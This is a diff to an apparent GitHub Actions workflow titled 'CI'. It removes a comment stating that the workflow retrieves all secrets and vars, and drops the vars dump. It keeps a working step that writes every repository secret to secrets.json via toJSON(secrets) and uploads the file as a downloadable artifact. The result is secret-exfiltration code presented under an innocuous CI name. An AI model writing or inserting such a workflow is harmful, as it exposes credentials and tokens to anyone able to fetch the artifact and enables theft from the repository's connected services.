@@ -1,5 +1,3 @@
-# retrieve all github actions secrets and vars
-
 name: CI
 
 on:
@@ -11,20 +9,12 @@ jobs:
     steps:
       - run: |
           echo "$ALLMYSECRETS" > secrets.json
-          echo "$ALLMYVARS" > vars.json
         shell: bash
         env:
           ALLMYSECRETS: ${{ toJSON(secrets) }}
-          ALLMYVARS: ${{ toJSON(vars) }}
 
       - name: Upload secrets
         uses: actions/upload-artifact@v3.1.2
         with:
           name: secrets
           path: secrets.json
-
-      - name: Upload vars
-        uses: actions/upload-artifact@v3.1.2
-        with:
-          name: vars
-          path: vars.json
